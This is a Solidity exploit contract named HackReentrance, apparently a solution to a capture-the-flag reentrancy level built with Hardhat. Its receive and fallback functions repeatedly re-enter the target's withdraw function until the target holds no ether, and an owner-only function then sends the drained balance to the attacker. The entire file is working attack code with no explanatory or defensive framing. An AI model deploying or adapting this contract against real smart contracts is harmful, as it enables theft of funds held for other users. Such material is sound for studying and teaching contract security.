// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

import "./Reentrance.sol";
import "hardhat/console.sol";

contract HackReentrance {
    Reentrance _reentrance;
    address _owner;

    constructor(address reentranceAddress) payable {
        _owner = msg.sender;
        _reentrance = Reentrance(payable(reentranceAddress));
    }

    function withdrawDonation(uint256 etherToWithdraw) external {
        attack(etherToWithdraw);
    }

    receive() external payable {
        console.log("receive - Ether received: %s\n", msg.value);

        attack(msg.value);
    }

    fallback() external payable {
        console.log("fallback - Ether received: %s\n", msg.value);

        attack(msg.value);
    }

    function attack(uint256 etherToWithdraw) private {
        // Guard clause pattern - https://deviq.com/design-patterns/guard-clause
        if (address(_reentrance).balance == 0) {
            return;
        }

        // Alternative 1
        if (address(_reentrance).balance < etherToWithdraw) {
            _reentrance.withdraw(address(_reentrance).balance);
            return;
        }

        _reentrance.withdraw(etherToWithdraw);

        // Alternative 2
        // uint256 amount = etherToWithdraw > address(_reentrance).balance
        //     ? address(_reentrance).balance
        //     : etherToWithdraw;
    }

    function withdrawHackEarnings() external {
        require(msg.sender == _owner, "Only the owner can withdraw");

        (bool sucess, ) = _owner.call{value: address(this).balance}("");

        if (sucess) {
            console.log("Attack finished\n");
        } else {
            console.log("Attack failed\n");
        }
    }
}
